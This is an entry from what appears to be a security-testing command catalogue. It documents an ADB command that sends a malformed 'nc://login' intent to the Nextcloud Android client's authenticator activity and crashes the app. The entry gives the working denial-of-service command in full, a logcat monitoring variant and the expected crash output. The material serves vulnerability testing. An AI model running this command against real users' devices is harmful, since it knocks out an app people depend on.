---
id: cmd-adb-am-start-nc-login
data: >-
  adb shell am start -a "android.intent.action.VIEW" -c
  "android.intent.category.DEFAULT" -n
  "com.nextcloud.client/com.owncloud.android.authentication.ModifiedAuthenticatorActivity"
  -d "nc://login"
tags:
  - dos
  - adb
  - intent
type: command
output: null
executor: bash
platforms:
  - Android
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:24:39.746Z'
verified: false
validated: true
submitted: true
---
# adb-shell-am-start-malformed-nc-login-intent

## Command

```bash
adb shell am start -a "android.intent.action.VIEW" -c "android.intent.category.DEFAULT" -n "com.nextcloud.client/com.owncloud.android.authentication.ModifiedAuthenticatorActivity" -d "nc://login"
```

## Description

This ADB command sends a malformed Android Intent to the Nextcloud client, targeting the `ModifiedAuthenticatorActivity` with a minimal `nc://login` URI, exploiting poor exception handling to crash the app and cause denial of service.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-a "android.intent.action.VIEW"` | Sets the intent action to VIEW for URI handling | Yes |
| `-c "android.intent.category.DEFAULT"` | Specifies DEFAULT category for standard intent resolution | Yes |
| `-n "com.nextcloud.client/com.owncloud.android.authentication.ModifiedAuthenticatorActivity"` | Targets the exact package and activity component | Yes |
| `-d "nc://login"` | Provides the malformed data URI that triggers the parsing exception | Yes |

## Examples

### Basic Usage

```bash
adb shell am start -a "android.intent.action.VIEW" -c "android.intent.category.DEFAULT" -n "com.nextcloud.client/com.owncloud.android.authentication.ModifiedAuthenticatorActivity" -d "nc://login"
```

### Advanced Usage

For repeated testing, combine with logcat monitoring:

```bash
adb logcat | grep -i exception &
adb shell am start -a "android.intent.action.VIEW" -c "android.intent.category.DEFAULT" -n "com.nextcloud.client/com.owncloud.android.authentication.ModifiedAuthenticatorActivity" -d "nc://login"
```

## Expected Output

The command returns a success message like "Starting: Intent { act=android.intent.action.VIEW cat=[android.intent.category.DEFAULT] cmp=com.nextcloud.client/... }". On the device, the app crashes immediately, visible via ANR dialog or force close, with logcat showing unhandled exception details.

## Related

- [[Related Procedure|procedures/Exploit-DoS-by-Sending-Malformed-Intent-with-ADB]]
